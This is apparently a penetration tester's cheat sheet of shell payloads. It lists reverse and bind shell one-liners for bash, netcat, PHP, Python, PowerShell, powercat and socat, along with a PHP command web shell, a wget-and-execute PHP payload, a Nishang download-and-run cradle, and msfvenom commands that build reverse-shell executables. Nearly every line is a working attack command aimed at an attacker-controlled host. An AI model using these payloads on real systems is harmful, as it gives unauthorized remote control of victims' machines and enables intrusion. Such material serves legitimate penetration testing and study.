# Shells

Bunch of different types of shells which can be deployed once you've obtained low-level execution on a target machine. Set up a Netcat listener to connect to on your attack machine.

Remember to go through them and specify your attack machines IP and the relevant port that your Netcat is listening on.

```
ls -al /usr/share/webshells/
```

Test Payloads:

```
whoami
echo $USER && cat /etc/issue
phpinfo()
```

## Bash

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <listener IP> <listener port> >/tmp/f
```

```
/bin/bash -i >& /dev/tcp/<listener IP>/443 0>&1
```

## cmd

#### Running Executables

```
C:\Windows\System32\cmd.exe /c <enter executable / command here>
start <enter command / executable here>
```

## nc

### Reverse

```
nc -nv <attacker IP> 1234 -e /bin/bash
ncat -nv <attacker IP> 4444 -e /mnt/c/Windows/system32/cmd.exe
```

### Bind

```
nc -nvlp 4444 -e /bin/bash
ncat -nvlp 4444 -e /mnt/c/Windows/system32/cmd.exe
```

## PHP

```
<?php passthru($_GET['cmd']);?>
```

```
<?php passthru($_GET['cmd']);?>`, `<?php $sock=fsockopen("<controller IP address>",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
```

Get shells using PHP:

```
<?php system("wget <attacker IP address>/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
```

Pass commands to it in the URL:

```
http://10.10.71.55:8080/oscommerce-2.3.4/catalog/install/includes/shell.php?cmd=whoami
```

{% embed url="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" %}
Chonky PHP Reverse Shell
{% endembed %}

## Python

### Upgrade Non-interactive Shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Reverse

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker machine>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Powercat

### Reverse

```
powercat -c <attacker IP> -p 443 -e cmd.exe
```

### Encoded Reverse

```
powercat -c <attacker IP> -p 443 -e cmd.exe -ge > encoded_reverseshell.ps1
powershell.exe -E <Base64 encoded string stored in encoded_reverseshell.ps1>
```

#### Bind

```
powercat -l -p 443 cmd.exe
```

## socat

### Reverse

```
socat TCP4:<remote IP address>:4443 EXEC:/bin/bash
socat TCP4:<remote IP address>:4443 EXEC:'cmd.exe',pipes
```

Catch it with `socat -d -d TCP4-LISTEN:4443 STDOUT`

### Bind

```
socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
socat -d -d TCP4-LISTEN:4443 EXEC:'cmd.exe',pipes
```

Connect to with `socat - TCP4:<remote IP address>:4443`

### More Stable TTY with socat

Listen with:

```
socat file:<backtick>tty<backtick>,echo=0,raw tcp-listen:4444
```

Then send shell with:

```
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker IP address>:4444
```

## PowerShell

### Reverse

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker machine>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..66535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();};$client.Close()"
```

### Bind

```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' +(pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

### Nishang

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<attacker IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <attacker IP> -Port 1337
```

## `msfvenom`

### General Staged

```
msfvenom -p windows/shell/reverse_tcp LHOST=<attacker machine> LPORT=443 -f exe -o shell_reverse.exe
```

### General Non-Staged

```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker machine> LPORT=443 -f exe -o shell_reverse.exe
```

### Java Application

```
msfvenom -p java/shell_reverse_tcp LHOST=<attacker machine> LPORT=4444 -f war -o shell.war
```

### Other Resources

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet" %}
Reverse Shell Cheat Sheet
{% endembed %}

{% embed url="https://github.com/captain-woof/Field-Manual/blob/master/Shells%20-%20Generating%20and%20Stabilising.md" %}
Shells - Generating and Stabalising
{% endembed %}

{% embed url="https://github.com/pentestmonkey" %}
Lots of Useful Things
{% endembed %}

{% embed url="https://github.com/mthbernardes/rsg" %}
A tool to generate various ways to do a reverse shell
{% endembed %}
